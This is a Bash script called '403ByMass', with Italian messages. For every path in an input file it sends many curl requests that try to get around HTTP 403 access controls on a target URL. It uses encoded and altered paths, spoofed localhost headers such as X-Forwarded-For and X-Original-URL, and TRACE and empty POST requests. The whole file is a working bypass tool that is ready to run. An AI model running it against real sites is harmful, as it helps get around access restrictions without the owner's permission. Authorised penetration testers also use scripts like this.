#! /bin/bash

figlet 403ByMass
echo "By Morryk - rev. 1.0"

# Controlla presenza input
if [ $# -eq 0 ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	exit 1
fi

if [ $# -ne 2 ] && [ $# -ne 3 ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	exit 1
fi

if [ ! -f "$2" ] || [ ! -r "$2" ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	echo "File non leggibile"
	exit 1
fi

url="$1"
outputFile="output.txt"
if [ -n $3 ]
then
	outputFile=$3
fi

while IFS= read -r path;
do

	echo "Test bypass: $path"
	echo ""
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path
	echo "  --> ${url}/${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/%2e/$path
	echo "  --> ${url}/%2e/${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/.
	echo "  --> ${url}/${path}/."
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url//$path//
	echo "  --> ${url}//${path}//"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/./$path/./
	echo "  --> ${url}/./${path}/./"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $path" $url/$path
	echo "  --> ${url}/${path} -H X-Original-URL: ${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $url/$path
	echo "  --> ${url}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $url/$path
	echo "  --> ${url}/${path} -H X-Forwarded-For: http://127.0.0.1"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $url/$path
	echo "  --> ${url}/${path} -H X-Forwarded-For: 127.0.0.1:80"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $path" $url
	echo "  --> ${url} -H X-rewrite-url: ${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%20
	echo "  --> ${url}/${path}%20"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%09
	echo "  --> ${url}/${path}%09"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path?
	echo "  --> ${url}/${path}?"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.html
	echo "  --> ${url}/${path}.html"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/?anything
	echo "  --> ${url}/${path}/?anything"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path#
	echo "  --> ${url}/${path}#"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
	echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/*
	echo "  --> ${url}/${path}/*"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.php
	echo "  --> ${url}/${path}.php"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.json
	echo "  --> ${url}/${path}.json"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
	echo "  --> ${url}/${path}  -X TRACE"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $url/$path
	echo "  --> ${url}/${path} -H X-Host: 127.0.0.1"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$url/$path..;/"
	echo "  --> ${url}/${path}..;/"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $url/$path;/"
	echo "  --> ${url}/${path};/"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
	echo "  --> ${url}/${path} -X TRACE"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $url/$path
	echo "  --> ${url}/${path} -H X-Forwarded-Host: 127.0.0.1"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $path" $url/$path
	echo "  --> ${url}/${path} -H Referer: $path"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $url/$path
	echo "  --> ${url}/${path} -H X-Originating-IP: 127.0.0.1"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Server: $url" $url/$path
	echo "  --> ${url}/${path} -H X-Forwarded-Server: $url"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Host-Override: $url" $url/$path
	echo "  --> ${url}/${path} -H X-HTTP-Host-Override: $url"
	echo "***************************************************************************************"
	echo ""
	echo ""
done < $2 | tee $outputFile
